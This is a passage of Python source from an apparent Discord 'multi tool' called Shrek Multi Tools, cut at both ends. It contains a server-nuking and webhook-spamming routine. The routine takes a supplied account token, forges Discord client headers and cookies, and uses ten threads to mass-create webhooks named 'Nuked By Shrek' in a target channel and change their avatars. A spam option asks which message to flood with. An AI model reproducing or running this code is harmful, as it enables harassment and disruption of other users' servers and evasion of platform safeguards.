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"

            ids = []
            for x in range(1):

                r = requests.post(url,headers=header,json={'name':'Nuked By Shrek'})

                try:
                    ids.append(r.json()['id'])
                except Exception as e:
                    print('')

                length = len(ids)
                for i in range(length):
                    header2 = {
                        "authority": "discord.com",
                        "method": "POST",
                        "path": f"/api/v9/webhooks/{ids[i]}",
                        "scheme": "https",
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US",
                        "Authorization": f'{tukan4}',
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        'referer': 'https://discord.com/channels/@me',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": useragent(),
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                    }
                    url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                    t = requests.patch(url1,headers=header2,json={'avatar':url2})

        threads = []

        for x in range(10):
            t = threading.Thread(target=spammer)
            t.daemon = True
            t.start()
            threads.append(t)

        for thread in threads:
            t.join()

        print("Finished! Created 10 webhooks named *Nuked by Shrek* and with avatars named *Shrek*")

    elif options2 in ['6','06']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Maker & Spammer")

      print(f'''
      {Fore.GREEN}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀      ███▄ ▄███▓ ▄▄▄      ▀██ ▄█▀▓█████ ██▀███  
▓█░ █ ░█░▓█   ▀ ▓█████▄ ▒▓██░ ██ ▒██▒  ██▒▒██▒  ██▒  ██▄█▒      ▓██▒▀█▀ ██▒▒████▄     ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█ ▒███   ▒██▒ ▄██░▒██▀▀██ ▒██░  ██▒▒██░  ██▒ ▓███▄░      ▓██    ▓██░▒██  ▀█▄  ▓███▄░ ▒███  ▓██ ░▄█ ▒
░█░ █ ░█ ▒▓█  ▄ ▒██░█▀   ░▓█ ░██ ▒██   ██░▒██   ██░ ▓██ █▄      ▒██    ▒██ ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
░░██▒██▓ ░▒████▒░▓█  ▀█▓ ░▓█▒░██▓░ ████▓▒░░ ████▓▒░ ▒██▒ █▄    ▒▒██▒   ░██▒ ▓█   ▓██ ▒██▒ █▄░▒████░██▓ ▒██▒
░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ▒▒ ▓▒    ░░ ▒░   ░  ░ ▒▒   ▓▒█ ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░   ░ ░  ░▒░▒   ░   ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ░▒ ▒░    ░░  ░      ░  ░   ▒▒  ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
  ░   ░     ░    ░    ░   ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░░ ░      ░      ░     ░   ▒   ░ ░░ ░    ░     ░   ░ 
    ░       ░  ░ ░        ░  ░  ░    ░ ░      ░ ░   ░  ░       ░       ░         ░   ░  ░      ░     ░     



      ''')
      chanid = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the channel id you want to make the webhooks in and spam them?: ''')
      msg = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What message do you want to spam?: ''')
      tukan3 = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token to use?: ''')

      print("Starting Now...")

      def spammer():
          url = f'https://discord.com/api/v9/channels/{chanid}/webhooks'

          def randstr(lenn):
              alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
              text = ''
              for i in range(0, lenn):
                  text += alpha[random.randint(0, len(alpha) - 1)]
              return text


          header = {
              "authority": "discord.com",
              "method": "POST",
              "path": f"/api/v9/channels/{chanid}/webhooks",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{tukan3}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
          }




          url2 = "data:image/jpeg;base64,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"

          ids = []
          token = []

          print("Succefully Created 10 Webhooks!")
          for x in range(1):

              r = requests.post(url,headers=header,json={'name':'Nuked By Shrek'})
              try:
                  ids.append(r.json()['id'])
                  token.append(r.json()['token'])
              except Exception as e:
                  print('')

              length = len(ids)
              for i in range(length):
                  header2 = {
                      "authority": "discord.com",
                      "method": "POST",
                      "path": f"/api/v9/webhooks/{ids[i]}",
                      "scheme": "https",
                      "accept": "*/*",
                      "accept-encoding": "gzip, deflate, br",
                      "accept-language": "en-US",
                      "Authorization": f'{tukan3}',
                      "content-length": "0",
                      "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                      "origin": "https://discord.com",
                      'referer': 'https://discord.com/channels/@me',
                      "sec-fetch-dest": "empty",
                      "sec-fetch-mode": "cors",
                      "sec-fetch-site": "same-origin",
                      "user-agent": useragent(),
                      "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                      "x-debug-options": "bugReporterEnabled",
